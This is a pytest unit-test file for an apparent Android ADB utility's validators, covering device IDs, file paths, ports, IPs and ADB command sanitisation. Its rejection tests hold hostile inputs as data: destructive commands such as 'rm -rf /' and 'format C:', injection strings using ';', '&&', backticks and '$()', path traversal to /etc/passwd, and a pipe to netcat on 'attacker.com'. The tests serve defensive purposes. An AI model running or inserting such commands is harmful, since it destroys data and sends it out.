"""
Unit Tests for Validators Utility

Tests all validation functions including device IDs, file paths, ADB commands,
port numbers, and IP addresses with various input scenarios.
"""

import pytest
from pathlib import Path
from unittest.mock import patch

from utils.validators import Validators


class TestValidateDeviceId:
    """Test device ID validation."""
    
    def test_validate_device_id_emulator(self):
        """Test validation of emulator device IDs."""
        # Standard emulator IDs
        assert Validators.validate_device_id("emulator-5554") is True
        assert Validators.validate_device_id("emulator-5556") is True
        assert Validators.validate_device_id("emulator-5558") is True
        
        # Invalid emulator IDs
        assert Validators.validate_device_id("emulator") is False
        assert Validators.validate_device_id("emulator-") is False
        assert Validators.validate_device_id("emulator-abc") is False
    
    def test_validate_device_id_physical_device(self):
        """Test validation of physical device IDs."""
        # Typical Android device serial numbers
        assert Validators.validate_device_id("ABC123DEF456") is True
        assert Validators.validate_device_id("1234567890ABCDEF") is True
        assert Validators.validate_device_id("HUAWEI123456789") is True
        
        # Device IDs with special characters
        assert Validators.validate_device_id("device:123:456") is True
        assert Validators.validate_device_id("device_serial_123") is True
    
    def test_validate_device_id_tcpip_device(self):
        """Test validation of TCP/IP device IDs."""
        # Valid IP:port combinations
        assert Validators.validate_device_id("192.168.1.100:5555") is True
        assert Validators.validate_device_id("10.0.0.1:5555") is True
        assert Validators.validate_device_id("localhost:5555") is True
        
        # Invalid IP:port combinations
        assert Validators.validate_device_id("192.168.1.100") is False
        assert Validators.validate_device_id("192.168.1.100:") is False
        assert Validators.validate_device_id(":5555") is False
        assert Validators.validate_device_id("192.168.1.100:99999") is False
    
    def test_validate_device_id_edge_cases(self):
        """Test device ID validation edge cases."""
        # Empty and None
        assert Validators.validate_device_id("") is False
        assert Validators.validate_device_id(None) is False
        
        # Very long device IDs
        long_id = "x" * 100
        assert Validators.validate_device_id(long_id) is True  # Should be valid
        
        # Very long device IDs (too long)
        very_long_id = "x" * 1000
        assert Validators.validate_device_id(very_long_id) is False
        
        # Unicode characters
        assert Validators.validate_device_id("设备123") is True
        
        # Special characters and spaces
        assert Validators.validate_device_id("device with spaces") is False
        assert Validators.validate_device_id("device\twith\ttabs") is False
        assert Validators.validate_device_id("device\nwith\nnewlines") is False
    
    @pytest.mark.parametrize("invalid_id", [
        "",           # Empty string
        " ",          # Just spaces
        "\t",         # Tab character
        "\n",         # Newline
        "a b",        # Contains space
        "a\tb",       # Contains tab
        "a\nb",       # Contains newline
        "192.168.1.100:70000",  # Port too high
        "999.999.999.999:5555", # Invalid IP
        "device..id", # Double dots
        "device//id", # Double slashes
    ])
    def test_validate_device_id_invalid_cases(self, invalid_id):
        """Test various invalid device ID cases."""
        assert Validators.validate_device_id(invalid_id) is False


class TestValidateFilePath:
    """Test file path validation."""
    
    def test_validate_file_path_valid_paths(self, temp_dir):
        """Test validation of valid file paths."""
        # Create test files
        test_file = temp_dir / "test_file.txt"
        test_file.touch()
        test_dir = temp_dir / "test_dir"
        test_dir.mkdir()
        
        # Valid existing file
        assert Validators.validate_file_path(str(test_file)) is True
        assert Validators.validate_file_path(test_file) is True
        
        # Valid existing directory
        assert Validators.validate_file_path(str(test_dir)) is True
        assert Validators.validate_file_path(test_dir) is True
        
        # Valid non-existing path in existing directory
        new_file = temp_dir / "new_file.txt"
        assert Validators.validate_file_path(str(new_file)) is True
    
    def test_validate_file_path_invalid_paths(self):
        """Test validation of invalid file paths."""
        # Paths with dangerous characters
        dangerous_paths = [
            "../../../etc/passwd",  # Path traversal
            "C:\\Windows\\System32", # System directory
            "/etc/passwd",          # System file
            "con",                  # Reserved Windows name
            "aux",                  # Reserved Windows name
            "nul",                  # Reserved Windows name
            "",                     # Empty path
            "   ",                  # Just spaces
        ]
        
        for path in dangerous_paths:
            assert Validators.validate_file_path(path) is False
    
    def test_validate_file_path_edge_cases(self, temp_dir):
        """Test file path validation edge cases."""
        # Very long path
        long_path = temp_dir / ("x" * 255)
        assert Validators.validate_file_path(str(long_path)) is True
        
        # Path with unicode characters
        unicode_path = temp_dir / "测试文件.txt"
        assert Validators.validate_file_path(str(unicode_path)) is True
        
        # Path with special characters
        special_path = temp_dir / "file with spaces & symbols.txt"
        assert Validators.validate_file_path(str(special_path)) is True
    
    def test_validate_file_path_permissions(self, temp_dir):
        """Test file path validation with permission considerations."""
        # This would require platform-specific permission testing
        # For now, just test that the function doesn't crash
        restricted_paths = [
            "/root/secret.txt",     # Likely no permission on Linux
            "C:\\Windows\\System32\\config\\SAM",  # No permission on Windows
        ]
        
        for path in restricted_paths:
            # Should not crash, might return False due to permissions
            result = Validators.validate_file_path(path)
            assert isinstance(result, bool)


class TestValidateAdbCommand:
    """Test ADB command validation."""
    
    def test_validate_adb_command_safe_commands(self):
        """Test validation of safe ADB commands."""
        safe_commands = [
            "adb devices",
            "adb shell ls",
            "adb install app.apk",
            "adb pull /sdcard/file.txt",
            "adb push file.txt /sdcard/",
            "adb shell getprop",
            "adb logcat",
            "adb shell dumpsys",
        ]
        
        for command in safe_commands:
            assert Validators.validate_adb_command(command) is True
    
    def test_validate_adb_command_dangerous_commands(self):
        """Test validation of dangerous ADB commands."""
        dangerous_commands = [
            "adb shell rm -rf /",           # Dangerous deletion
            "adb shell su",                 # Root escalation
            "adb shell chmod 777 /system",  # Permission changes
            "rm -rf *",                     # Not even ADB command
            "format C:",                    # Format command
            "del /Q *.*",                   # Delete command
            "; rm -rf /",                   # Command injection
            "adb shell && rm file",         # Command chaining
            "adb shell | dangerous_cmd",    # Command piping
        ]
        
        for command in dangerous_commands:
            assert Validators.validate_adb_command(command) is False
    
    def test_validate_adb_command_edge_cases(self):
        """Test ADB command validation edge cases."""
        # Empty and None
        assert Validators.validate_adb_command("") is False
        assert Validators.validate_adb_command(None) is False
        
        # Commands without 'adb' prefix
        assert Validators.validate_adb_command("devices") is False
        assert Validators.validate_adb_command("shell ls") is False
        
        # Commands with extra whitespace
        assert Validators.validate_adb_command("  adb devices  ") is True
        
        # Very long commands
        long_command = "adb shell " + "ls " * 100
        result = Validators.validate_adb_command(long_command)
        assert isinstance(result, bool)  # Should handle gracefully
    
    def test_validate_adb_command_with_device_flag(self):
        """Test validation of ADB commands with device flags."""
        device_commands = [
            "adb -s emulator-5554 devices",
            "adb -s ABC123 shell ls",
            "adb -d install app.apk",     # -d for USB device
            "adb -e shell getprop",       # -e for emulator
        ]
        
        for command in device_commands:
            assert Validators.validate_adb_command(command) is True
    
    @pytest.mark.parametrize("injection_attempt", [
        "adb shell; rm -rf /",
        "adb shell && format C:",
        "adb shell | nc attacker.com 1234",
        "adb shell `rm file`",
        "adb shell $(rm file)",
        "adb shell & rm file",
    ])
    def test_validate_adb_command_injection_attempts(self, injection_attempt):
        """Test ADB command validation against injection attempts."""
        assert Validators.validate_adb_command(injection_attempt) is False


class TestSanitizeCommand:
    """Test command sanitization."""
    
    def test_sanitize_command_basic(self):
        """Test basic command sanitization."""
        # Safe commands should pass through unchanged
        safe_command = "adb devices"
        sanitized = Validators.sanitize_command(safe_command)
        assert sanitized == safe_command
        
        safe_command2 = "adb shell ls /sdcard"
        sanitized2 = Validators.sanitize_command(safe_command2)
        assert sanitized2 == safe_command2
    
    def test_sanitize_command_remove_dangerous_chars(self):
        """Test sanitization removes dangerous characters."""
        dangerous_commands = [
            ("adb shell; rm file", "adb shell rm file"),
            ("adb shell && rm file", "adb shell rm file"),
            ("adb shell | cat", "adb shell cat"),
            ("adb shell `ls`", "adb shell ls"),
            ("adb shell $(ls)", "adb shell ls"),
        ]
        
        for dangerous, expected in dangerous_commands:
            sanitized = Validators.sanitize_command(dangerous)
            # Should remove or replace dangerous characters
            assert ";" not in sanitized
            assert "&&" not in sanitized
            assert "|" not in sanitized
            assert "`" not in sanitized
            assert "$(" not in sanitized
    
    def test_sanitize_command_preserve_safe_chars(self):
        """Test sanitization preserves safe characters."""
        command_with_safe_chars = "adb shell 'ls -la /sdcard/test file.txt'"
        sanitized = Validators.sanitize_command(command_with_safe_chars)
        
        # Should preserve quotes, spaces, slashes, dots, hyphens
        assert "'" in sanitized or '"' in sanitized
        assert " " in sanitized
        assert "/" in sanitized
        assert "." in sanitized
        assert "-" in sanitized
    
    def test_sanitize_command_edge_cases(self):
        """Test command sanitization edge cases."""
        # Empty command
        assert Validators.sanitize_command("") == ""
        
        # Command with only dangerous characters
        dangerous_only = ";&&|`$()"
        sanitized = Validators.sanitize_command(dangerous_only)
        # Should remove all dangerous characters
        for char in ";&&|`$()":
            assert char not in sanitized
        
        # Unicode command
        unicode_command = "adb shell echo '测试'"
        sanitized = Validators.sanitize_command(unicode_command)
        assert "测试" in sanitized


class TestValidatePortNumber:
    """Test port number validation."""
    
    def test_validate_port_number_valid_ports(self):
        """Test validation of valid port numbers."""
        valid_ports = [
            1,          # Minimum valid port
            80,         # HTTP
            443,        # HTTPS
            5555,       # ADB default
            8080,       # Common alternate
            65535,      # Maximum valid port
            "1",        # String representation
            "5555",     # String representation
            "65535",    # String representation
        ]
        
        for port in valid_ports:
            assert Validators.validate_port_number(port) is True
    
    def test_validate_port_number_invalid_ports(self):
        """Test validation of invalid port numbers."""
        invalid_ports = [
            0,          # Below minimum
            -1,         # Negative
            65536,      # Above maximum
            70000,      # Well above maximum
            "0",        # String below minimum
            "65536",    # String above maximum
            "",         # Empty string
            "abc",      # Non-numeric string
            None,       # None value
            [],         # List
            {},         # Dict
        ]
        
        for port in invalid_ports:
            assert Validators.validate_port_number(port) is False
    
    def test_validate_port_number_reserved_ports(self):
        """Test validation considers reserved ports."""
        # System/reserved ports (1-1023) might have special handling
        reserved_ports = [1, 21, 22, 23, 25, 53, 80, 443, 993, 995]
        
        for port in reserved_ports:
            result = Validators.validate_port_number(port)
            # Should still be technically valid, but might warn
            assert isinstance(result, bool)
    
    @pytest.mark.parametrize("port_input", [
        1.5,        # Float
        "1.5",      # Float as string
        "1,000",    # With comma
        " 5555 ",   # With whitespace
        "+5555",    # With plus sign
    ])
    def test_validate_port_number_edge_cases(self, port_input):
        """Test port validation edge cases."""
        result = Validators.validate_port_number(port_input)
        assert isinstance(result, bool)


class TestValidateIpAddress:
    """Test IP address validation."""
    
    def test_validate_ip_address_valid_ipv4(self):
        """Test validation of valid IPv4 addresses."""
        valid_ipv4 = [
            "192.168.1.1",
            "10.0.0.1",
            "172.16.0.1",
            "127.0.0.1",
            "8.8.8.8",
            "1.1.1.1",
            "255.255.255.255",
            "0.0.0.0",
        ]
        
        for ip in valid_ipv4:
            assert Validators.validate_ip_address(ip) is True
    
    def test_validate_ip_address_invalid_ipv4(self):
        """Test validation of invalid IPv4 addresses."""
        invalid_ipv4 = [
            "256.1.1.1",        # Octet > 255
            "1.1.1",            # Too few octets
            "1.1.1.1.1",        # Too many octets
            "1.1.1.-1",         # Negative octet
            "1.1.1.a",          # Non-numeric octet
            "",                 # Empty string
            "localhost",        # Hostname, not IP
            "192.168.1",        # Incomplete
            "192.168.1.1.1",    # Too many parts
        ]
        
        for ip in invalid_ipv4:
            assert Validators.validate_ip_address(ip) is False
    
    def test_validate_ip_address_valid_ipv6(self):
        """Test validation of valid IPv6 addresses."""
        valid_ipv6 = [
            "2001:0db8:85a3:0000:0000:8a2e:0370:7334",
            "2001:db8:85a3::8a2e:370:7334",
            "::1",
            "::",
            "fe80::1",
            "2001:db8::1",
        ]
        
        for ip in valid_ipv6:
            assert Validators.validate_ip_address(ip) is True
    
    def test_validate_ip_address_invalid_ipv6(self):
        """Test validation of invalid IPv6 addresses."""
        invalid_ipv6 = [
            "2001:0db8:85a3::8a2e::7334",  # Double ::
            "2001:0db8:85a3:0000:0000:8a2e:0370:7334:extra",  # Too many groups
            "gggg::1",                      # Invalid hex
            ":::",                         # Triple colon
        ]
        
        for ip in invalid_ipv6:
            assert Validators.validate_ip_address(ip) is False
    
    def test_validate_ip_address_edge_cases(self):
        """Test IP address validation edge cases."""
        edge_cases = [
            None,           # None value
            "",             # Empty string
            " ",            # Just spaces
            "192.168.1.1 ", # Trailing space
            " 192.168.1.1", # Leading space
            "192.168.01.1", # Leading zeros
        ]
        
        for case in edge_cases:
            result = Validators.validate_ip_address(case)
            assert isinstance(result, bool)
    
    def test_validate_ip_address_special_addresses(self):
        """Test validation of special IP addresses."""
        special_addresses = [
            "0.0.0.0",          # All zeros
            "255.255.255.255",  # Broadcast
            "127.0.0.1",        # Loopback
            "169.254.1.1",      # Link-local
            "224.0.0.1",        # Multicast
        ]
        
        for ip in special_addresses:
            # These are technically valid IPs
            assert Validators.validate_ip_address(ip) is True


class TestValidatorsIntegration:
    """Integration tests for multiple validation functions."""
    
    def test_device_command_validation_workflow(self):
        """Test complete validation workflow for device commands."""
        device_id = "emulator-5554"
        command = "adb -s emulator-5554 shell ls"
        
        # Validate device ID first
        assert Validators.validate_device_id(device_id) is True
        
        # Validate command
        assert Validators.validate_adb_command(command) is True
        
        # Sanitize command
        sanitized = Validators.sanitize_command(command)
        assert sanitized == command  # Should be unchanged for safe command
    
    def test_file_operation_validation_workflow(self, temp_dir):
        """Test validation workflow for file operations."""
        source_file = temp_dir / "source.txt"
        source_file.touch()
        dest_file = temp_dir / "destination.txt"
        
        # Validate source file exists
        assert Validators.validate_file_path(source_file) is True
        
        # Validate destination path is safe
        assert Validators.validate_file_path(dest_file) is True
        
        # Create ADB command for file operation
        command = f"adb pull /sdcard/test.txt {dest_file}"
        assert Validators.validate_adb_command(command) is True
    
    def test_network_device_validation_workflow(self):
        """Test validation workflow for network device connections."""
        ip_address = "192.168.1.100"
        port = 5555
        device_id = f"{ip_address}:{port}"
        
        # Validate IP address
        assert Validators.validate_ip_address(ip_address) is True
        
        # Validate port
        assert Validators.validate_port_number(port) is True
        
        # Validate combined device ID
        assert Validators.validate_device_id(device_id) is True
        
        # Create connection command
        command = f"adb connect {device_id}"
        assert Validators.validate_adb_command(command) is True